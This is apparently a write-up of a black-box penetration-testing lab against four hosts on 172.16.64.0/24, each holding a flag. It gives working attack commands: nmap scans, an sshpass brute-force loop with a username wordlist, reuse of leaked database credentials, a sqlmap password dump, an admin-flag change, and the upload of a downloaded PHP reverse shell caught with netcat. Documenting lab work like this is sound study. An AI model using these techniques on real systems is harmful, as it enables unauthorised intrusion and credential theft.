---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test 2

## Discover live hosts on the network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
```

{% hint style="info" %}
Find more [**nmap options**](https://ferx.gitbook.io/wiki/linux/command-line/nmap).
{% endhint %}

### Hosts Alive

| Host | OS |
| :--- | :--- |
| 172.16.64.81 \(cms.foocorp.io, static.foocorp.io\) | Linux |
| 172.16.64.91 | Linux |
| 172.16.64.92 | Linux |
| 172.16.64.166 | Linux |

## Open Ports and Running Services

### 172.16.64.81 \(flag in mysql\)

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 13306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |

### 172.16.64.91

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 6379 | redis | Redis key-value store |

### 172.16.64.92 \(var/www/flag.txt\)

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 \(Ubuntu Linux; protocol 2.0\) |
| 53 | 53 | dnsmasq 2.75 |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 13306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |

### 172.16.64.166 \(flag under sabrina user\)

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 2222 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 \(Ubuntu Linux; protocol 2.0\) |
|  8080 | http | Apache httpd 2.4.18 \(Ubuntu\) |

## Machines

### 172.16.64.166

![](../../../.gitbook/assets/image%20%285%29.png)

```text
elizabeth 
Lopez
elizabethlopez
elopez
managingdirector
director
manager  
tara
baker
tarabaker
tbaker
designer
beckycasey
becky
casey
bcasey
project
manager 
projectmanager
randy
carlson
randycarlson
rcarlson
developer
pabloroberts
pablo
roberts
proberts
founder
bessiehammond
bessie
hammond
bhammond
programmer 
gerardomalone
gerardo
malone
gmalone
juniordesigner
junior
designer
sabrina 
summers
sabrinasummers
ssummers
analyst
```

```bash
#!/bin/sh

for user in $(cat users.txt); 
do
    echo "Trying '$user'..."
    sshpass -p CHANGEME ssh -p 2222 $user@172.16.64.166 2>/dev/null
    if [ $? -eq 0 ]; then
        exit
    fi
done;
```

```bash
sabrina@xubuntu:~$ cat flag.txt 
Congratulations! You have successfully exploited this machine.
Go for the others now.
```

```text
sabrina@xubuntu:~$ cat hosts.bak 
127.0.0.1       localhost
172.16.64.81    cms.foocorp.io
172.16.64.81    static.foocorp.io

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### 172.16.64.81

![](../../../.gitbook/assets/image%20%286%29.png)

```text
john1john1:password123
peter:youdonotguessthatone5
```

### 172.16.64.92

```text
X-DB-Key: x41x41x412019!
X-DB-User: root
X-DB-name: mysql
```

![](../../../.gitbook/assets/image%20%284%29.png)

```bash
# Tried:
# mysql --host=172.16.64.92 --user=root --password=x41x41x412019! --port 63306 mysql
# Working:

mysql --host=172.16.64.81 --user=root --password=x41x41x412019! --port 13306 mysql
> show databases;
> use cmsbase;
> show tables;
+----------------------------+
| Tables_in_cmsbase          |
+----------------------------+
| flag                       |
| sqlmapfile                 |
| tbl_1_actions_log          |
| tbl_1_categories           |
| tbl_1_categories_relations |
| tbl_1_downloads            |
| tbl_1_files                |
| tbl_1_files_relations      |
| tbl_1_folders              |
| tbl_1_groups               |
| tbl_1_members              |
| tbl_1_members_requests     |
| tbl_1_notifications        |
| tbl_1_options              |
| tbl_1_password_reset       |
| tbl_1_users                |
| tbl_actions_log            |
| tbl_categories             |
| tbl_categories_relations   |
| tbl_downloads              |
| tbl_files                  |
| tbl_files_relations        |
| tbl_folders                |
| tbl_groups                 |
| tbl_members                |
| tbl_members_requests       |
| tbl_notifications          |
| tbl_options                |
| tbl_password_reset         |
| tbl_users                  |
+----------------------------+
30 rows in set (0.141 sec)

MySQL [cmsbase]> select * from cmsbase.flag
    -> ;
+----+------------------------------+
| id | content                      |
+----+------------------------------+
|  1 | Congratulations, you got it! |
+----+------------------------------+
1 row in set (0.141 sec)

```

```text
mysql --host=172.16.64.92 --user=fcadmin1 --password=c5d71f305bb017a66c5fa7fd66535b84 --port 63306 footracking
```

```text
sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking -T users --dump
Database: footracking                                                                                                                
Table: users
[4 entries]
+----+-----+-------------------------------------------+-----------+
| id | adm | password                                  | username  |
+----+-----+-------------------------------------------+-----------+
| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
+----+-----+-------------------------------------------+-----------+
```

![](../../../.gitbook/assets/image%20%287%29.png)

![](../../../.gitbook/assets/image%20%2813%29.png)

```text
<!-- = '127.0.0.1'; = 'dbuser'; = 'xXxyYyzZz789789)))'; = 'footracking'; = mysqli_connect(, , , );-->
```

```text
mysql --host=172.16.64.92 --user=dbuser --password=xXxyYyzZz789789))) --port 63306 footracking
> update users set adm='yes' where id=3;
```

![admin](../../../.gitbook/assets/image%20%289%29.png)

![](../../../.gitbook/assets/image%20%288%29.png)

![](../../../.gitbook/assets/image%20%2811%29.png)

```text
127.0.0.1	dns.foocorp.io
127.0.1.1	xubuntu
127.0.0.1    iy1f8c0rbn4i50qsd4qp.foocorp.io
127.0.0.1    zwue6qr1bozxee6ajbnh.foocorp.io
127.0.0.1    imhiwugyiw47frjgiij4.foocorp.io
127.0.0.1    ckwhi4l4zo2p7uuu6spz.foocorp.io
127.0.0.1    8hyyv3bd2vg11lvnq6b5.foocorp.io
127.0.0.1    fn8e3b420dm0tekjkat6.foocorp.io
127.0.0.1    fi2ziinpstes1v37p4d4.foocorp.io
127.0.0.1    kjz616ki35x4tmbnktdh.foocorp.io
127.0.0.1    zl4fslkpip7pqvl8attn.foocorp.io
127.0.0.1    q2qp90okqfpuf8z6qpl4.foocorp.io
127.0.0.1    8kq8hxubqgv2xtk4thgb.foocorp.io
127.0.0.1    anbapwaf51a4hnvhcyat.foocorp.io
127.0.0.1    b5haajglmpf4oit5bjm4.foocorp.io
127.0.0.1    djsx2456qb9uaht0kd64.foocorp.io
127.0.0.1    goy4eil8flnwlsupnd1d.foocorp.io
127.0.0.1    f72wlqc48agc3875keiq.foocorp.io
127.0.0.1    hdny0sw0xnu2h3woeze6.foocorp.io
127.0.0.1    j8mgna1cxid6hc603ugq.foocorp.io
127.0.0.1    fe20nnrl0vnxcb6963se.foocorp.io
127.0.0.1    z5cmau4ies9uwe4xfziw.foocorp.io
127.0.0.1    48c1afiow6rdt39bzdlm.foocorp.io
127.0.0.1    o8m5ma2371xe8z3l0ghc.foocorp.io
127.0.0.1    4lwoyyvjg0unxz692pyf.foocorp.io
127.0.0.1    hppbkxyes0heecvcisko.foocorp.io
127.0.0.1    9afw8mkkyog4fi5rk4bj.foocorp.io
127.0.0.1    2l2fhjboktwk3flrtq3k.foocorp.io
127.0.0.1    yq0q4x5d2vpucsrps3a1.foocorp.io
127.0.0.1    jcpgttczoggxfc3f25tm.foocorp.io
127.0.0.1    0pm6duqbu2o8ajzkjeai.foocorp.io
127.0.0.1    ttpxbpp88fgt9r3292ag.foocorp.io
172.16.64.91    75ajvxi36vchsv584es1.foocorp.io
127.0.0.1    9fys6zpn5k03zt299wyj.foocorp.io
127.0.0.1    uvq8daoyiuq75znffwvy.foocorp.io
127.0.0.1    qv0jwarev2y4lq69xy9w.foocorp.io
127.0.0.1    h1z07t1pujg9ti677md0.foocorp.io
127.0.0.1    k47x59arbizhwqoyy04q.foocorp.io
127.0.0.1    h7ix8b28e1nzzg0juphd.foocorp.io
127.0.0.1    1hwtyp1f5x456czwcwux.foocorp.io
127.0.0.1    jw37e55tbtczfjne6zqv.foocorp.io
127.0.0.1    xew9oz8r7dg8nfs5apq9.foocorp.io
127.0.0.1    2oe8hpeyq6v4ihnj5mb7.foocorp.io
127.0.0.1    ibp2xvjt4ysuvhjb49px.foocorp.io
127.0.0.1    xvd7fegs05xx2v1cjoi8.foocorp.io
127.0.0.1    gdgecqumgna9gylo5tt8.foocorp.io
127.0.0.1    ysapyi9ob6ddgbbzpt63.foocorp.io
127.0.0.1    rqcmqndvgfsekwwy4vgz.foocorp.io
127.0.0.1    in8qd11im2ya2gecsu3r.foocorp.io
127.0.0.1    u0nh94i31l7i5z4ny4mp.foocorp.io
127.0.0.1    53xdmt8o6x9qh3c8rnav.foocorp.io
127.0.0.1    jwwu7iov4jmc9u7bjb9c.foocorp.io
127.0.0.1    2i2ztmdjpv2eb617ra0v.foocorp.io
127.0.0.1    fdwrshpyzssjq5yda1kd.foocorp.io
127.0.0.1    264eybx0yiy07nv2yi0p.foocorp.io
127.0.0.1    zvlvgjfv1mebz32nmq63.foocorp.io
127.0.0.1    6l83fq68pv3t8nc5ynq2.foocorp.io
127.0.0.1    34l136cqhaogwfww9x82.foocorp.io
127.0.0.1    0dlbn52zsrxa547ilv9b.foocorp.io
127.0.0.1    wbzny08xz4zydaut3apy.foocorp.io
127.0.0.1    b2ezlylj37skdrxvkm7v.foocorp.io
127.0.0.1    dxr2k1ahg0bxm8wbg0hn.foocorp.io
127.0.0.1    5cg49zf6n1gs1dnq5u3v.foocorp.io
127.0.0.1    dapqf3pnluku2txm0652.foocorp.io
127.0.0.1    oer6ycrynweft5skbmux.foocorp.io
127.0.0.1    krhflurc0580erpqam3c.foocorp.io
127.0.0.1    xk16t9hcq1searehrhhf.foocorp.io
127.0.0.1    j4bfjd381vetby4rxaj5.foocorp.io
127.0.0.1    f78fz1p7rv3a8dgkby0v.foocorp.io
127.0.0.1    usvf2byvslgt0s8io91x.foocorp.io
127.0.0.1    evtcvwrn6crvfeoqyrbl.foocorp.io
127.0.0.1    3njj7cfc9j0qrmgb17t1.foocorp.io
127.0.0.1    rawbalxwrbxa8efg1hq1.foocorp.io
127.0.0.1    zlkxys2bvalnureium3n.foocorp.io
127.0.0.1    4k09492kj7u7n1afepzn.foocorp.io
127.0.0.1    v59svzohexao6tgrr7rq.foocorp.io
127.0.0.1    iaqar5fxun7ytj4xqf8x.foocorp.io
127.0.0.1    11mx1flyr50d3zt9goi3.foocorp.io
127.0.0.1    j6jrmtruysat16qo6w7s.foocorp.io
127.0.0.1    43d2k35em6ydaxnpvtun.foocorp.io
127.0.0.1    p2c06nsbqfjt73h28pqp.foocorp.io
127.0.0.1    m81e8uuwflet9dgsvibt.foocorp.io
127.0.0.1    ujrvd3yj5wlwszhxgog0.foocorp.io
127.0.0.1    4vt8ehj91xb5kea26hgp.foocorp.io
127.0.0.1    axltw99yt1v0dpskuimf.foocorp.io
127.0.0.1    iml77nd9ou3l99p9yxa5.foocorp.io
127.0.0.1    zs9xad7z70e1zb9g6y2h.foocorp.io
127.0.0.1    ahra6jh4p2rt5t4bh8gz.foocorp.io
127.0.0.1    ryg3zale8n0kzu0hnrym.foocorp.io
127.0.0.1    hdzuhx7pdhoa22lvszou.foocorp.io
127.0.0.1    h6esni1hq4r0ygh98uge.foocorp.io
127.0.0.1    mpnw16d3epbi1pqkvw8k.foocorp.io
127.0.0.1    k6z33hu73ax9virswxso.foocorp.io
127.0.0.1    o7alycoqzbu0n75x5ymi.foocorp.io
127.0.0.1    n1tsohsykt79lyv3yoch.foocorp.io
127.0.0.1    7a3p565g4f4fc59lhc1d.foocorp.io
127.0.0.1    y2ecyuslfi9l3el2h7nt.foocorp.io
127.0.0.1    0bnes919xtro0y34jb64.foocorp.io
127.0.0.1    xn0ur7q4f6r7lf2jc2zi.foocorp.io
127.0.0.1    qjuih48nzdjy70ylv4t1.foocorp.io
127.0.0.1    coitkr5g3s331kusu04f.foocorp.io
127.0.0.1    a7mcp90jyox2myn0eolw.foocorp.io
```

### 172.16.64.91

```text
172.16.64.91    75ajvxi36vchsv584es1.foocorp.io
```

![](../../../.gitbook/assets/image%20%2812%29.png)

![](../../../.gitbook/assets/image%20%2810%29.png)

To disable JS, copy file locally, and modify to:

```markup
<html><body style="background: black; color: white;">
<center><div style="border: 1px yellow double">
<br /><br />
<form action="http://75ajvxi36vchsv584es1.foocorp.io/app/upload.php" method="post" enctype="multipart/form-data">
<br />Select file to upload:
<input type="file" name="fileToUpload" id="fileToUpload">
<input type="submit" value="Upload" name="submit">
</form>
<br /><br />
</div></center/>
<hr /><br />
<center>&copy; FooCORP 2019</center>
<body></html>
```

Download, modify and upload to your local webpage this reverse shell while you listen with `nc -lnvp 1234` in your machine: 

```text
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i 's/127.0.0.1/172.16.64.10/' php-payload.php
```

In your netcat:

```text
$ cat ./var/www/html/flag.txt
Congratulations, you got this!
```

